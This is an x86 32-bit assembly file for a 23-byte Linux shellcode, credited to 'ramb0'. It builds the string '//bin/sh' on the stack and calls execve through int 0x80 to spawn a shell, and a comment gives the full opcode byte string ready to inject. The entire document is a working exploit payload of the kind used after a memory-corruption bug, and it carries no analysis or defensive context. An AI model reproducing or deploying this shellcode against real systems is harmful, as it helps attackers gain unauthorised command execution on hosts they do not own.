
; x32 bit shellcode by ramb0
; 23 bytes long
; \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80

section .text
global _start

_start:
	xor eax, eax
	push eax		; string terminator

	; //bin/sh
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp		; move stack buffer to ebx
	xor ecx, ecx
	xor edx, edx
	mov al, 0xb		; execve()
	int 0x80
